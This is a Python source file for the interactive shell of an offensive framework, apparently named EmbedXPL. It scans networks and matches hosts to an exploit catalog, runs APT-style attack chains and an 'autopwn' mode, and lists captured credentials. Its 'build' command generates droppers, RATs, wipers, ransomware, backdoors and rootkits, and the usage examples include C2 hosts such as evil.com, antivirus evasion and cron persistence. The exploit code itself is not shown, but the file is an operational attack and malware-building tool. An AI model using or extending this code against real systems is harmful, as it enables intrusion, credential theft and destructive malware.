import atexit
import getopt
import itertools
import os
import signal
import sys
import traceback
from collections import Counter
from pathlib import Path

# Adaptation credits: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
from embedxpl.core.exploit.exceptions import EmbedXPLException
from embedxpl.core.exploit.exploit import GLOBAL_OPTS
from embedxpl.core.exploit.payloads import BasePayload
from embedxpl.core.exploit.printer import (
    PrinterThread,
    pprint_dict_in_order,
    print_error,
    print_info,
    print_status,
    print_success,
    print_table,
    print_warning,
    printer_queue,
)
from embedxpl.core.exploit.utils import (
    MODULES_DIR,
    WORDLISTS_DIR,
    humanize_path,
    import_exploit,
    index_modules,
    module_required,
    pythonize_path,
    stop_after,
)

try:
    import readline
except ImportError:
    class _ReadlineShim:
        """Fallback shim for platforms without GNU readline (e.g. Windows)."""

        __doc__ = ""

        @staticmethod
        def read_history_file(*args, **kwargs):
            return None

        @staticmethod
        def set_history_length(*args, **kwargs):
            return None

        @staticmethod
        def write_history_file(*args, **kwargs):
            return None

        @staticmethod
        def parse_and_bind(*args, **kwargs):
            return None

        @staticmethod
        def set_completer(*args, **kwargs):
            return None

        @staticmethod
        def set_completer_delims(*args, **kwargs):
            return None

        @staticmethod
        def get_line_buffer():
            return ""

        @staticmethod
        def get_begidx():
            return 0

        @staticmethod
        def get_endidx():
            return 0

    readline = _ReadlineShim()


from embedxpl.interpreter._core import _EmbedXPLInterpreterCore


class EmbedXPLInterpreter(_EmbedXPLInterpreterCore):
    """EmbedXPL main interpreter - extended commands."""

    def command_sysinfo(self, *args, **kwargs):
        """Display detailed hardware profile of the host machine."""
        from rich.table import Table

        from embedxpl.core.exploit.printer import console as _con
        from embedxpl.core.hw_profiler import HWProfiler

        profile = HWProfiler.detect(force=True)
        self._hw_profile = profile

        from embedxpl.core import config as exf_config
        saved_mode = exf_config.get("compute_mode", "auto")
        if saved_mode in ("cpu", "gpu", "hybrid", "auto"):
            profile.compute_mode = saved_mode

        cpu_table = Table(title="CPU", show_header=True, header_style="bold cyan",
                          border_style="dim", pad_edge=True)
        cpu_table.add_column("Property", style="bold")
        cpu_table.add_column("Value")
        cpu_table.add_row("Model", profile.cpu_model)
        cpu_table.add_row("Architecture", profile.cpu_arch)
        cpu_table.add_row("Cores", str(profile.cpu_cores))
        cpu_table.add_row("Threads", str(profile.cpu_threads))
        freq_str = "{} MHz".format(profile.cpu_freq_mhz) if profile.cpu_freq_mhz else "N/A"
        cpu_table.add_row("Frequency", freq_str)
        _con.print(cpu_table)

        ram_table = Table(title="Memory (RAM)", show_header=True, header_style="bold cyan",
                          border_style="dim", pad_edge=True)
        ram_table.add_column("Property", style="bold")
        ram_table.add_column("Value")
        ram_table.add_row("Total", "{:,} MB".format(profile.ram_total_mb))
        ram_table.add_row("Available", "{:,} MB".format(profile.ram_available_mb))
        _con.print(ram_table)

        if profile.gpus:
            gpu_table = Table(title="GPU Devices", show_header=True, header_style="bold cyan",
                              border_style="dim", pad_edge=True)
            gpu_table.add_column("#", style="dim")
            gpu_table.add_column("Name", style="bold")
            gpu_table.add_column("Vendor")
            gpu_table.add_column("VRAM")
            gpu_table.add_column("Backend")
            gpu_table.add_column("Driver")
            gpu_table.add_column("Compute Cap")
            for g in profile.gpus:
                vram = "{:,} MB".format(g.vram_mb) if g.vram_mb else "N/A"
                gpu_table.add_row(
                    str(g.index), g.name, g.vendor, vram,
                    g.backend, g.driver or "N/A", g.compute_cap or "N/A",
                )
            _con.print(gpu_table)
        else:
            print_warning("No GPU detected on this system")

        mode = profile.compute_mode
        if mode == "auto":
            resolved = "hybrid" if profile.has_gpu() else "cpu"
            mode_display = "auto -> {}".format(resolved)
        else:
            mode_display = mode
        _con.print(
            "\n [bold]Compute mode:[/bold] [cyan]{}[/cyan]  |  "
            "[bold]Best backend:[/bold] [cyan]{}[/cyan]\n".format(
                mode_display, profile.best_backend
            )
        )

    def command_compute(self, *args, **kwargs):
        """Set the compute mode for ML/GPU operations.

        Usage: compute <cpu|gpu|hybrid|auto>
        """
        from embedxpl.core import config as exf_config

        try:
            mode = args[0].strip().lower()
        except (IndexError, AttributeError):
            mode = ""

        valid_modes = ("cpu", "gpu", "hybrid", "auto")
        if mode not in valid_modes:
            print_error(
                "Invalid compute mode '{}'. Choose from: {}".format(
                    mode, ", ".join(valid_modes)
                )
            )
            return

        self._hw_profile.compute_mode = mode
        if not self._validate_compute_mode():
            exf_config.set_val("compute_mode", self._hw_profile.compute_mode)
            return

        exf_config.set_val("compute_mode", mode)
        print_success("compute_mode => {}".format(mode))

        if mode == "auto":
            resolved = "hybrid" if self._hw_profile.has_gpu() else "cpu"
            print_info("  auto resolves to: {}".format(resolved))

    @stop_after(2)
    def complete_compute(self, text, *args, **kwargs):
        modes = ["cpu", "gpu", "hybrid", "auto"]
        if text:
            return [m for m in modes if m.startswith(text)]
        return modes

    def command_discover(self, *args, **kwargs):
        """Scan a subnet (or multiple targets from a file) and match live hosts against the exploit catalog.

        Session-aware: if a host was scanned before (same IP+MAC), shows
        previous findings and offers to resume (skip already-tested modules)
        or restart from scratch.

        Usage:
            discover <subnet/CIDR>
            discover <subnet/CIDR> --fresh        (ignore session, full rescan)
            discover -T <targets.txt>              (scan all IPs/CIDRs listed in file)
            discover -T <targets.txt> --fresh

        Examples:
            discover 192.168.1.0/24
            discover 10.0.0.1
            discover 192.168.18.0/24 --fresh
            discover -T /path/to/targets.txt
        """
        from datetime import datetime

        from rich.panel import Panel
        from rich.table import Table

        from embedxpl.core.discovery import NetworkDiscovery
        from embedxpl.core.exploit.printer import console as _con

        raw_args = list(args)
        force_fresh = "--fresh" in raw_args
        if force_fresh:
            raw_args.remove("--fresh")

        # -T <file> handling inside interactive shell
        if "-T" in raw_args:
            t_idx = raw_args.index("-T")
            try:
                t_file = raw_args[t_idx + 1]
            except IndexError:
                print_error("Usage: discover -T <targets.txt>")
                return
            self._scan_from_targets_file(t_file)
            return

        try:
            target = raw_args[0].strip()
        except (IndexError, AttributeError):
            print_error(
                "Usage: discover <subnet/CIDR>  |  discover -T <targets.txt>"
            )
            return

        try:
            import ipaddress
            ipaddress.ip_network(target, strict=False)
        except ValueError:
            try:
                ipaddress.ip_address(target)
            except ValueError:
                print_error("Invalid target: '{}'. Use IP or CIDR notation.".format(target))
                return

        def progress_cb(stage: str, detail: str) -> None:
            print_status("[{}] {}".format(stage, detail))

        print_info()
        print_status("Starting network discovery on {}".format(target))
        discovery = NetworkDiscovery(target)

        try:
            hosts = discovery.scan(callback=progress_cb)
        except KeyboardInterrupt:
            print_warning("Discovery cancelled by user")
            hosts = discovery.hosts
        except Exception as exc:
            print_error("Discovery failed: {}".format(exc))
            return

        if not hosts:
            print_warning("No live hosts found on {}".format(target))
            return

        # --- Session integration: check for existing sessions ---
        sessions_resumed = 0
        sessions_new = 0

        for h in hosts:
            session, is_existing = self._session_mgr.get_or_create(h.ip, h.mac)

            if is_existing and not force_fresh:
                sessions_resumed += 1
                prev_tested = len(session.modules_tested())
                prev_vulns = len(session.vulns_found)
                last_dt = datetime.fromtimestamp(session.last_scanned).strftime("%Y-%m-%d %H:%M")

                _con.print(
                    "\n[bold yellow]SESSION FOUND[/bold yellow] for "
                    "[bold]{ip}[/bold] ({mac}) — "
                    "last scan: {dt}, tested: {t}, vulns: {v}".format(
                        ip=h.ip,
                        mac=h.mac or "no-mac",
                        dt=last_dt,
                        t=prev_tested,
                        v=prev_vulns,
                    )
                )

                pending = session.modules_pending()
                if pending:
                    _con.print(
                        "  [dim]{} module(s) already tested, "
                        "{} pending — resuming from where it stopped[/dim]".format(
                            prev_tested, len(pending),
                        )
                    )

                if session.vulns_found:
                    _con.print("  [bold red]Previous vulns:[/bold red]")
                    for v in session.vulns_found:
                        _con.print("    [red]• {}[/red]".format(v))
            else:
                sessions_new += 1

            session.merge_discovery(
                ip=h.ip,
                mac=h.mac,
                hostname=h.hostname,
                vendor=h.vendor_guess,
                model=h.model_guess,
                open_ports=h.open_ports,
                banners={str(k): v for k, v in h.banners.items()},
                fingerprint_confidence=h.fingerprint_confidence,
                matched_modules=h.matched_modules,
                has_wireless=h.has_wireless,
                wireless_ssids=h.wireless_ssids,
                wireless_recommendation=h.wireless_recommendation,
            )
            self._session_mgr.save(session)

        if sessions_resumed:
            _con.print()
            print_success(
                "{} host(s) resumed from session history, {} new".format(
                    sessions_resumed, sessions_new,
                )
            )
            _con.print("[dim]Use 'discover {} --fresh' to ignore history and rescan from zero[/dim]".format(target))
        elif sessions_new:
            print_info("{} new session(s) created".format(sessions_new))

        # --- Results table ---
        results_table = Table(
            title="Discovered Hosts ({})".format(len(hosts)),
            show_header=True,
            header_style="bold cyan",
            border_style="dim",
            pad_edge=True,
        )
        results_table.add_column("IP", style="bold")
        results_table.add_column("MAC")
        results_table.add_column("Hostname")
        results_table.add_column("Ports")
        results_table.add_column("Vendor", style="bold green")
        results_table.add_column("Model")
        results_table.add_column("Confidence")
        results_table.add_column("Modules", style="bold yellow")
        results_table.add_column("Tested", style="green")
        results_table.add_column("Pending", style="red")
        results_table.add_column("WiFi", style="cyan")

        for h in hosts:
            ports = ",".join(str(p) for p in h.open_ports[:8])
            conf_str = "{:.0%}".format(h.fingerprint_confidence) if h.fingerprint_confidence else "-"
            mod_count = str(len(h.matched_modules)) if h.matched_modules else "-"
            wifi_flag = "Yes" if h.has_wireless else "-"

            session = self._session_mgr.load(h.ip, h.mac)
            tested_count = str(len(session.modules_tested())) if session else "0"
            pending_count = str(len(session.modules_pending())) if session else mod_count

            results_table.add_row(
                h.ip,
                h.mac or "-",
                h.hostname or "-",
                ports or "-",
                h.vendor_guess or "-",
                h.model_guess or "-",
                conf_str,
                mod_count,
                tested_count,
                pending_count,
                wifi_flag,
            )

        _con.print(results_table)

        # --- Module matching details ---
        targets_with_mods = discovery.hosts_with_modules()
        if targets_with_mods:
            print_success(
                "\n{} host(s) matched against the exploit catalog:".format(len(targets_with_mods))
            )
            for h in targets_with_mods:
                vendor_tag = "[{}]".format(h.vendor_guess) if h.vendor_guess else ""
                model_tag = h.model_guess or ""

                session = self._session_mgr.load(h.ip, h.mac)
                tested_set = set(session.modules_tested()) if session else set()
                vuln_set = set(session.vulns_found) if session else set()

                _con.print(
                    "  [bold]{ip}[/bold] {vendor} {model} -- "
                    "[yellow]{count}[/yellow] exploit module(s)".format(
                        ip=h.ip,
                        vendor=vendor_tag,
                        model=model_tag,
                        count=len(h.matched_modules),
                    )
                )

                for mod in h.matched_modules[:15]:
                    if mod in vuln_set:
                        status_tag = " [bold red]VULN[/bold red]"
                    elif mod in tested_set:
                        status_tag = " [green]tested[/green]"
                    else:
                        status_tag = " [dim]pending[/dim]"
                    _con.print("    use {mod}{st}".format(
                        mod=mod.replace(".", "/"),
                        st=status_tag,
                    ))
                if len(h.matched_modules) > 15:
                    _con.print(
                        "    [dim]... and {} more[/dim]".format(
                            len(h.matched_modules) - 15
                        )
                    )
        else:
            print_info("No discovered hosts matched the exploit catalog.")

        # --- WirelessXPL-Forge cross-reference ---
        wifi_hosts = discovery.hosts_with_wireless()
        if wifi_hosts:
            _con.print()
            for h in wifi_hosts:
                if h.wireless_recommendation:
                    ssid_label = ""
                    if h.wireless_ssids:
                        ssid_label = "  SSIDs: {}".format(", ".join(h.wireless_ssids))
                    tag = "[bold magenta]RECOMMENDED[/bold magenta]" if not h.matched_modules else "[bold cyan]COMPLEMENTARY[/bold cyan]"
                    _con.print(Panel(
                        "{tag} {ip} ({vendor} {model}){ssid}\n\n"
                        "[dim]{rec}[/dim]".format(
                            tag=tag,
                            ip=h.ip,
                            vendor=h.vendor_guess or "Unknown",
                            model=h.model_guess or "",
                            ssid=ssid_label,
                            rec=h.wireless_recommendation,
                        ),
                        title="[bold]WirelessXPL-Forge[/bold]",
                        border_style="magenta" if not h.matched_modules else "cyan",
                        expand=False,
                    ))

        print_info()

    def command_sessions(self, *args, **kwargs):
        """Manage scan session history (like John the Ripper's --restore).

        Usage:
            sessions                     List all saved sessions
            sessions list                Same as above
            sessions show <ip>           Show detailed session for a host
            sessions delete <ip>         Delete session for a host
            sessions export <ip>         Export session as JSON
            sessions purge               Delete ALL sessions (asks confirmation)
        """
        from datetime import datetime

        from rich.panel import Panel
        from rich.table import Table

        from embedxpl.core.exploit.printer import console as _con

        sub = ""
        sub_args: list = []
        if args:
            parts = args[0].strip().split() if isinstance(args[0], str) else list(args)
            if parts:
                sub = parts[0].lower()
                sub_args = parts[1:]

        if sub in ("", "list"):
            sessions = self._session_mgr.list_sessions()
            if not sessions:
                print_info("No saved sessions. Run 'discover <target>' to create one.")
                return

            tbl = Table(
                title="Saved Sessions ({})".format(len(sessions)),
                show_header=True,
                header_style="bold cyan",
                border_style="dim",
            )
            tbl.add_column("#", style="dim")
            tbl.add_column("IP", style="bold")
            tbl.add_column("MAC")
            tbl.add_column("Vendor", style="green")
            tbl.add_column("Model")
            tbl.add_column("Scans", style="yellow")
            tbl.add_column("Tested", style="green")
            tbl.add_column("Pending", style="red")
            tbl.add_column("Vulns", style="bold red")
            tbl.add_column("Last Scan")
            tbl.add_column("ID", style="dim")

            for i, s in enumerate(sessions, 1):
                last_dt = "-"
                if s.get("last_scanned"):
                    last_dt = datetime.fromtimestamp(s["last_scanned"]).strftime("%Y-%m-%d %H:%M")
                tbl.add_row(
                    str(i),
                    s.get("ip", "?"),
                    s.get("mac", "-"),
                    s.get("vendor", "-"),
                    s.get("model", "-"),
                    str(s.get("total_scans", 0)),
                    str(s.get("tested", 0)),
                    str(s.get("pending", 0)),
                    str(s.get("vulns", 0)),
                    last_dt,
                    s.get("host_id", "?")[:8],
                )
            _con.print(tbl)
            _con.print("[dim]Use 'sessions show <ip>' for details[/dim]")
            return

        if sub == "show":
            if not sub_args:
                print_error("Usage: sessions show <ip>")
                return
            ip = sub_args[0]
            session = self._session_mgr.load(ip)
            if not session:
                print_warning("No session found for {}".format(ip))
                return

            first_dt = datetime.fromtimestamp(session.first_seen).strftime("%Y-%m-%d %H:%M") if session.first_seen else "-"
            last_dt = datetime.fromtimestamp(session.last_scanned).strftime("%Y-%m-%d %H:%M") if session.last_scanned else "-"

            header = (
                "[bold]{ip}[/bold] ({mac})\n"
                "Vendor: [green]{vendor}[/green]  Model: {model}\n"
                "First seen: {first}  Last scan: {last}\n"
                "Total scans: [yellow]{scans}[/yellow]  "
                "Ports: {ports}\n"
                "WiFi: {wifi}{ssids}"
            ).format(
                ip=session.ip,
                mac=session.mac or "no-mac",
                vendor=session.vendor or "?",
                model=session.model or "?",
                first=first_dt,
                last=last_dt,
                scans=session.total_scans,
                ports=",".join(str(p) for p in session.open_ports[:12]) or "-",
                wifi="Yes" if session.has_wireless else "No",
                ssids=" ({})".format(", ".join(session.wireless_ssids)) if session.wireless_ssids else "",
            )
            _con.print(Panel(header, title="[bold]Session Detail[/bold]", border_style="cyan"))

            # Module results breakdown
            tested = session.modules_tested()
            vulns = session.modules_vulnerable()
            safe = session.modules_safe()
            errored = session.modules_errored()
            pending = session.modules_pending()

            _con.print("\n[bold]Module Execution Summary:[/bold]")
            _con.print("  Matched:  [yellow]{}[/yellow]".format(len(session.matched_modules)))
            _con.print("  Tested:   [green]{}[/green]".format(len(tested)))
            _con.print("  Pending:  [red]{}[/red]".format(len(pending)))
            _con.print("  Vuln:     [bold red]{}[/bold red]".format(len(vulns)))
            _con.print("  Safe:     [green]{}[/green]".format(len(safe)))
            _con.print("  Errored:  [yellow]{}[/yellow]".format(len(errored)))

            if vulns:
                _con.print("\n[bold red]Confirmed Vulnerabilities:[/bold red]")
                for v in vulns:
                    _con.print("  [red]• {}[/red]".format(v))

            if pending:
                _con.print("\n[bold]Pending Modules (not yet tested):[/bold]")
                for m in pending[:20]:
                    _con.print("  [dim]• {}[/dim]".format(m))
                if len(pending) > 20:
                    _con.print("  [dim]... and {} more[/dim]".format(len(pending) - 20))

            if session.module_results:
                _con.print("\n[bold]Execution History (last 20):[/bold]")
                hist_tbl = Table(show_header=True, header_style="dim", border_style="dim", pad_edge=True)
                hist_tbl.add_column("Module")
                hist_tbl.add_column("Result")
                hist_tbl.add_column("Time")
                hist_tbl.add_column("Elapsed")

                for r in session.module_results[-20:]:
                    if r.vulnerable is True:
                        res_str = "[bold red]VULNERABLE[/bold red]"
                    elif r.vulnerable is False:
                        res_str = "[green]safe[/green]"
                    elif r.error:
                        res_str = "[yellow]error[/yellow]"
                    else:
                        res_str = "[dim]unknown[/dim]"
                    ts = datetime.fromtimestamp(r.timestamp).strftime("%m-%d %H:%M") if r.timestamp else "-"
                    hist_tbl.add_row(
                        r.module_path.split(".")[-1] if "." in r.module_path else r.module_path,
                        res_str,
                        ts,
                        "{:.1f}s".format(r.elapsed_s),
                    )
                _con.print(hist_tbl)

            if session.notes:
                _con.print("\n[bold]Notes:[/bold]")
                for note in session.notes:
                    _con.print("  [dim]{}[/dim]".format(note))

            return

        if sub == "delete":
            if not sub_args:
                print_error("Usage: sessions delete <ip>")
                return
            ip = sub_args[0]
            if self._session_mgr.delete(ip):
                print_success("Session for {} deleted".format(ip))
            else:
                print_warning("No session found for {}".format(ip))
            return

        if sub == "export":
            if not sub_args:
                print_error("Usage: sessions export <ip>")
                return
            ip = sub_args[0]
            data = self._session_mgr.export_session(ip)
            if data:
                _con.print(data)
            else:
                print_warning("No session found for {}".format(ip))
            return

        if sub == "purge":
            _con.print("[bold red]WARNING: This will delete ALL saved sessions![/bold red]")
            try:
                confirm = input("Type 'yes' to confirm: ").strip().lower()
            except (EOFError, KeyboardInterrupt):
                print_info("Cancelled")
                return
            if confirm == "yes":
                count = self._session_mgr.purge_all()
                print_success("Purged {} session(s)".format(count))
            else:
                print_info("Cancelled")
            return

        print_error("Unknown sub-command '{}'. Use: list, show, delete, export, purge".format(sub))

    def _record_module_result(
        self,
        target_ip: str,
        module_path: str,
        vulnerable=None,
        error=None,
        elapsed: float = 0.0,
        port: int = 0,
    ) -> None:
        """Record a module execution result into the session for the target host."""
        if not target_ip:
            return
        import time as _time

        from embedxpl.core.session import ModuleResult

        session = self._session_mgr.load(target_ip)
        if not session:
            session, _ = self._session_mgr.get_or_create(target_ip)

        result = ModuleResult(
            module_path=module_path,
            vulnerable=vulnerable,
            error=error,
            elapsed_s=elapsed,
            port=port,
            timestamp=_time.time(),
        )
        session.add_result(result)
        self._session_mgr.save(session)

    def command_apt(self, *args, **kwargs):
        """Browse and execute APT group attack chains.

        Usage:
            apt                          List all APT groups
            apt list                     Same as above
            apt show <group_id>          Show attacks for a group
            apt search <keyword>         Search groups by device/CVE
            apt run <group_id>           Run ALL attacks for a group (interactive)
            apt run <group_id> <attack#> Run a specific attack by index
        """
        from rich.panel import Panel
        from rich.table import Table

        from embedxpl.core.apt_catalog import (
            find_groups_by_cve,
            find_groups_by_device,
            get_group,
            list_groups,
        )
        from embedxpl.core.exploit.printer import console as _con

        sub = ""
        sub_args: list = []
        if args:
            parts = args[0].strip().split() if isinstance(args[0], str) else list(args)
            if parts:
                sub = parts[0].lower()
                sub_args = parts[1:]

        if sub in ("", "list"):
            groups = list_groups()
            tbl = Table(
                title="APT Groups Targeting Network Devices ({})".format(len(groups)),
                show_header=True, header_style="bold cyan", border_style="dim",
            )
            tbl.add_column("ID", style="bold")
            tbl.add_column("Name", style="green")
            tbl.add_column("Country")
            tbl.add_column("Aliases", style="dim")
            tbl.add_column("Attacks", justify="center")
            tbl.add_column("MITRE")

            for g in groups:
                tbl.add_row(
                    g.id, g.name, g.country,
                    ", ".join(g.aliases[:3]),
                    str(len(g.attacks)),
                    g.mitre_id,
                )
            _con.print(tbl)
            print_info("Use 'apt show <group_id>' for details or 'apt run <group_id>' to execute")
            return

        if sub == "show":
            if not sub_args:
                print_error("Usage: apt show <group_id>")
                return
            group = get_group(sub_args[0])
            if not group:
                print_error("Unknown group: {}".format(sub_args[0]))
                return

            header = "[bold]{name}[/bold] ({country})\n{desc}".format(
                name=group.name, country=group.country, desc=group.description,
            )
            _con.print(Panel(header, title="APT Profile: {}".format(group.id), border_style="red"))

            tbl = Table(show_header=True, header_style="bold red", border_style="dim")
            tbl.add_column("#", style="dim", width=3)
            tbl.add_column("Phase", style="cyan")
            tbl.add_column("Attack", style="bold")
            tbl.add_column("CVEs", style="yellow")
            tbl.add_column("Modules", style="green")
            tbl.add_column("Devices")
            tbl.add_column("Auth", justify="center")

            for i, atk in enumerate(group.attacks):
                tbl.add_row(
                    str(i), atk.phase, atk.name,
                    "\n".join(atk.cves) if atk.cves else "-",
                    "\n".join(atk.modules),
                    "\n".join(atk.target_devices[:2]),
                    "Yes" if atk.requires_auth else "No",
                )
            _con.print(tbl)
            print_info("Use 'apt run {} [attack#]' to execute".format(group.id))
            return

        if sub == "search":
            keyword = " ".join(sub_args) if sub_args else ""
            if not keyword:
                print_error("Usage: apt search <device_or_cve>")
                return

            results = find_groups_by_device(keyword) if not keyword.upper().startswith("CVE-") else find_groups_by_cve(keyword)
            if not results:
                print_info("No APT groups found for '{}'".format(keyword))
                return

            for g in results:
                print_success("{} ({}) — {} attacks".format(g.name, g.country, len(g.attacks)))
                for atk in g.attacks:
                    if keyword.lower() in " ".join(atk.target_devices).lower() or keyword.upper() in atk.cves:
                        print_info("  -> {} [{}]".format(atk.name, ", ".join(atk.cves) if atk.cves else atk.phase))
            return

        if sub == "run":
            if not sub_args:
                print_error("Usage: apt run <group_id> [attack_index]")
                return
            group = get_group(sub_args[0])
            if not group:
                print_error("Unknown group: {}".format(sub_args[0]))
                return

            attack_idx = None
            if len(sub_args) > 1:
                try:
                    attack_idx = int(sub_args[1])
                except ValueError:
                    print_error("Attack index must be a number")
                    return

            attacks_to_run = [group.attacks[attack_idx]] if attack_idx is not None else group.attacks

            for atk in attacks_to_run:
                if not atk.modules:
                    print_status("Skipping '{}' — no executable module".format(atk.name))
                    continue

                module_path = atk.modules[0]
                print_status("[{}] {} — loading {}".format(atk.phase, atk.name, module_path))

                try:
                    self.command_use(module_path)
                    if hasattr(self, "current_module") and self.current_module:
                        print_status("Module loaded. Set target and run with 'run' or 'check'")
                        return
                except Exception as exc:
                    print_error("Failed to load {}: {}".format(module_path, exc))
            return

        print_error("Unknown subcommand: {}. Use 'apt', 'apt list', 'apt show', 'apt search', 'apt run'".format(sub))

    # ------------------------------------------------------------------
    # AutoPwn command
    # ------------------------------------------------------------------

    def command_autopwn(self, *args, **kwargs):
        """autopwn <segment> <target> — run all modules for a segment against a target.

        Examples:
          autopwn router 192.168.1.1
          autopwn camera 10.0.0.50
          autopwn firewall 172.16.0.1
        """
        if len(args) < 2:
            print_error("Usage: autopwn <segment> <target>")
            print_info("Segments: router, camera, firewall, ics, printer, wireless, nas, smart_tv, mikrotik")
            return

        segment = args[0].lower()
        target  = args[1]

        print_info(f"AutoPwn {segment.upper()} against {target} (check_only=True by default)")
        print_info("Tip: Pass 'exploit' as 3rd arg to run in exploit mode instead of check-only")

        check_only = True if (len(args) < 3 or args[2] != "exploit") else False
        mode = "check" if check_only else "exploit"
        print_info(f"Mode: {mode}")

        try:
            from embedxpl.modules.autopwn.segment import SegmentAutoPwn
            # Attach DB if available
            db = getattr(self, "_exf_db", None)
            ap = SegmentAutoPwn(segment=segment, targets=target,
                                check_only=check_only, verbose=True, db=db)
            report = ap.run()
            print_success(f"AutoPwn complete: {report.modules_run} modules, {report.modules_vulnerable} vulnerable")
        except Exception as exc:
            print_error(f"AutoPwn error: {exc}")

    # ------------------------------------------------------------------
    # DB commands: workspace, hosts, vulns, creds
    # ------------------------------------------------------------------

    def _get_db(self):
        """Return or lazily create the EXFDatabase instance."""
        if not hasattr(self, "_exf_db") or self._exf_db is None:
            try:
                from embedxpl.core.database import EXFDatabase
                self._exf_db = EXFDatabase()
                self._exf_db.workspace("default")
            except Exception:
                self._exf_db = None
        return self._exf_db

    def command_workspace(self, *args, **kwargs):
        """workspace [list | <name>] — create/select workspaces."""
        db = self._get_db()
        if db is None:
            print_error("EXFDatabase not available")
            return
        if not args or args[0] == "list":
            ws_list = db.list_workspaces()
            if ws_list:
                rows = [[w["id"], w["name"], w["created_at"]] for w in ws_list]
                print_table(["ID", "Name", "Created"], *rows)
            else:
                print_info("No workspaces yet. Use: workspace <name>")
            return
        name = args[0]
        db.workspace(name)
        print_success(f"Workspace: {name}")

    def command_hosts(self, *args, **kwargs):
        """hosts — list discovered hosts in current workspace."""
        db = self._get_db()
        if db is None:
            print_error("EXFDatabase not available")
            return
        hosts = db.hosts()
        if not hosts:
            print_info("No hosts yet. Run modules with set rhost / run to discover.")
            return
        rows = [[h["address"], h.get("os",""), h.get("status",""), h["svc_count"], h["vuln_count"], h["cred_count"]] for h in hosts]
        print_table(["Address", "OS", "Status", "Services", "Vulns", "Creds"], *rows)

    def command_vulns(self, *args, **kwargs):
        """vulns — list all found vulnerabilities in current workspace."""
        db = self._get_db()
        if db is None:
            print_error("EXFDatabase not available")
            return
        vulns = db.vulns()
        if not vulns:
            print_info("No vulnerabilities recorded yet.")
            return
        rows = [[v.get("address",""), v.get("severity","").upper(), ",".join(v.get("cve_ids",[])), v.get("module_path","").split(".")[-1], v.get("found_at","")[:16]] for v in vulns]
        print_table(["Host", "Severity", "CVEs", "Module", "Found At"], *rows)

    def command_creds(self, *args, **kwargs):
        """creds — list all captured credentials in current workspace."""
        db = self._get_db()
        if db is None:
            print_error("EXFDatabase not available")
            return
        creds = db.creds()
        if not creds:
            print_info("No credentials captured yet.")
            return
        rows = [[c.get("address",""), c.get("username",""), c.get("password",""), c.get("cred_type",""), c.get("found_at","")[:16]] for c in creds]
        print_table(["Host", "Username", "Password", "Type", "Found At"], *rows)

    def command_nse(self, *args, **kwargs):
        """nse install | list | run <script> <target> — Manage EmbedXPL NSE scripts."""
        from embedxpl.tools.nse_installer import install, run_nse, status
        if not args:
            print_info("Usage: nse install | list | run <script> <target>")
            return
        subcmd = args[0].lower()
        if subcmd == "install":
            result = install(dry_run="--dry-run" in args)
            print_success(f"NSE: {len(result.get('added',[]))} added, "
                          f"{len(result.get('updated',[]))} updated, "
                          f"{len(result.get('skipped',[]))} skipped")
        elif subcmd == "list":
            status()
        elif subcmd == "run" and len(args) >= 3:
            run_nse(args[1], args[2])
        else:
            print_info("Usage: nse install | list | run <script> <target>")

    def command_build(self, *args, **kwargs):
        """build <component> [--lang LANG] [--arch ARCH] [--transport PROTO] [--c2 HOST] [--port PORT]
           [--persist METHOD] [--evasion PROFILE] [--output PATH]

        Build malware components in multiple languages/architectures.

        Components: dropper | stager | rat | implant | wiper | ransomware | backdoor | rootkit

        Examples:
            build dropper --lang python --arch armle --transport https --c2 10.0.0.1 --port 443
            build rat --lang go --arch arm64 --transport dns --c2 evil.com --persist cron
            build wiper --lang c --arch x64 --scope mbr,files
            build ransomware --lang python --evasion defender --persist cron
            build backdoor --lang powershell --c2 10.0.0.1 --port 4444 --evasion defender
        """
        if not args:
            print_info("Usage: build <component> [options]")
            print_info("Components: dropper | stager | rat | implant | wiper | ransomware | backdoor | rootkit")
            return

        component = args[0].lower()

        # Parse --key value arguments
        cfg_kwargs = {"component": component}
        i = 1
        while i < len(args):
            a = str(args[i])
            if a.startswith("--") and i + 1 < len(args):
                key = a[2:].replace("-", "_")
                val = str(args[i + 1])
                if key in ("port", "key_bits", "key_size"):
                    try: val = int(val)
                    except ValueError: pass
                elif key == "scope":
                    val = [s.strip() for s in val.split(",")]
                elif key == "extensions":
                    val = [s.strip() for s in val.split(",")]
                cfg_kwargs[key] = val
                i += 2
            else:
                i += 1

        # Map common aliases
        if "c2" in cfg_kwargs:
            cfg_kwargs["c2_host"] = cfg_kwargs.pop("c2")
        if "lang" not in cfg_kwargs:
            cfg_kwargs["lang"] = "python"
        if "arch" not in cfg_kwargs:
            cfg_kwargs["arch"] = "x64"

        try:
            from embedxpl.core.malware_builder.builder import BuildConfig, MalwareBuilder
            cfg = BuildConfig.from_args(**cfg_kwargs)

            print_info(f"Building {component} [{cfg.lang}/{cfg.arch}] transport={cfg.transport}")
            if cfg.evasion:
                print_info(f"Evasion profile: {cfg.evasion}")

            builder = MalwareBuilder(cfg)
            result = builder.build()

            if result.success:
                print_success(str(result))
                print_info(f"Output: {result.output_path}")
                if result.source_path:
                    print_info(f"Source: {result.source_path}")
            else:
                print_error(f"Build failed: {result.error}")

        except ImportError as e:
            print_error(f"Malware builder not available: {e}")
        except Exception as e:
            import traceback
            print_error(f"Build error: {e}")
            print_info(traceback.format_exc()[-300:])

    def command_exit(self, *args, **kwargs):
        raise EOFError

